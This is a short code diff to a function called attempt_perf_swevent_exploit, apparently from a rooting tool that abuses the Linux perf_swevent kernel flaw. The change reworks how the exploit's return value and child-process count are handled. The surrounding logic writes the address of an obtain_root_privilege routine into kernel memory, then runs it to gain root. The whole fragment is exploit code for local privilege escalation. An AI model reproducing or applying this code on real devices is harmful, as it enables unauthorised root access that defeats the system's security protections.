@@ -103,10 +103,9 @@ static bool
 attempt_perf_swevent_exploit(unsigned long int address)
 {
   int number_of_children;
-  pid_t pid;
 
-  pid = perf_swevent_write_value_at_address(address, (unsigned long int)&obtain_root_privilege);
-  if (pid == 0) {
+  number_of_children = perf_swevent_write_value_at_address(address, (unsigned long int)&obtain_root_privilege);
+  if (number_of_children == 0) {
     while (true) {
       sleep(1);
     }
@@ -114,7 +113,6 @@ attempt_perf_swevent_exploit(unsigned long int address)
 
   run_obtain_root_privilege();
 
-  number_of_children = (int)&obtain_root_privilege / PERF_SWEVENT_MAX_FILE + 1;
   perf_swevent_reap_child_process(number_of_children);
 
   return true;
